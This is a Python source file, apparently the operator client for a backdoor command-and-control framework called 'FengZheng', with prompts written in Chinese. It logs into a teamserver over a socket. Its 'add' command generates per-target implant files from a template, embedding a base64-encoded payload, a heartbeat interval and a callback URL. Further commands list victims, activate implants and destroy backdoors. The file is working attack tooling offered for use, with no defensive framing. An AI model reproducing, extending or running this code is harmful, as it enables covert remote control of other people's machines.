import base64
import socket
import json
import argparse



def parse_args():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--target", help="teamserver主机地址",default="127.0.0.1")
    parse.add_argument("-p", "--port", help="teamserver端口",default=9000)
    args = parse.parse_args()
    return args


# 以server.py为模板，生成新的文件
def create(flag, time, payload, baseurl):
    with open("./template/server.py", "r",encoding='utf_8') as f:
        with open("server_"+str(flag)+".py", "w",encoding='utf_8') as g:
            for line in f.readlines():
                if "flag =" in line:
                    line = "flag = \""+flag+"\"\n"
                if "time =" in line:
                    line = "time = "+str(time)+"\n"
                if "payload =" in line:
                    line = "payload = \""+payload+"\"\n"
                if "baseurl =" in line:
                    line = "baseurl = \""+baseurl+"\"\n"
                g.write(line)
    #print("已在根目录生成server.py文件")



def cserver():
    args = parse_args()
    target =args.target
    #print(target)
    port = args.port
    #print(port)



    ts=str(target)
    tp=int( port)



    sk = socket.socket()
    sk.connect((ts, tp))

# 处理收发数据的逻辑
    pwd = input("请输入您的密码:")
    bytes_msg = pwd.encode()
    sk.send(bytes_msg)

# 接收服务器端发送过来的数据
    res_msg = sk.recv(1024).decode()
    #print(res_msg)
    dic_code = json.loads(res_msg)
    if dic_code["code"]:
        print("welcome FengZheng")
        while True:
            cmd = input("------请输入命令------\n\n\n")
            cmd = str(cmd)
            if cmd == "add":
                sk.send(bytes(cmd, encoding="utf_8"))
                targets=input("请输入目标主机地址:")
                sk.send(bytes(targets, encoding="utf_8"))
                flag=sk.recv(1024).decode()
                
                
                #print("请输入添加flag的信息，例如：-t 60 -p payload -b baseurl\n")
                time = input("请输入心跳时间，单位秒:")
                #payload = input("请输入payload:")
                payload=base64.b64encode(input("请输入payload:") .encode('utf-8')).decode('utf-8')
                #print(payload)
                baseurl = input("请输入teamserver的http地址，请注意端口:")
                create(flag, time, payload, baseurl)

                print("本条数据已添加成功，flag为："+flag)
                print("已生成新的server_"+flag+".py文件")


                print("数据添加成功")
            elif cmd == 'list':
                sk.send(bytes(cmd, encoding="utf_8"))
                print("\n已执行请求\n")
                res_msg = sk.recv(1024*99).decode()
                print(res_msg)
            elif cmd == 'del':
                sk.send(bytes(cmd, encoding="utf_8"))
                cmd2 = input("请输入也要删除目标的flag\n")
                cmd3 = str(cmd2)
                sk.send(bytes(cmd3, encoding="utf_8"))
                print("\n已执行")
            elif cmd == 'alive':
                sk.send(bytes(cmd, encoding="utf_8"))
                cmd2 = str(input("请输入要激活的flag\n"))
                #cmd3 = str(cmd2)
                sk.send(bytes(cmd2, encoding="utf_8"))
                ifalive=sk.recv(1024).decode()
                if ifalive=="1":
                    print("flag为"+cmd2+"的目标已激活")
                else:
                    print("flag为"+cmd2+"的数据不存在")
                print("\n已执行")
            elif cmd == "exit":
                print("\n您已离开控制器")

                sk.send(bytes(cmd, encoding="utf_8"))
                #sleep(5)
                sk.close()
                break
            elif cmd == "test":
                sk.send(bytes(cmd, encoding="utf_8"))
                res_msg = sk.recv(1024).decode()
                print(res_msg)
                # break
            elif cmd == "help":
                print("add:生成server并添加一条数据 \n")
                print("list:获取数据列表 \n")
                print("del:销毁后门并删除一条数据 \n")
                print("exit:退出client \n")
                print("test:测试连通性 \n")
                print("alive:激活远程server(需等待一次心跳周期) \n")
            else:
                print("请输入help查看功能命令")
    else:
        print("\n登录失败,断开连接\n")
    sk.close()


cserver()
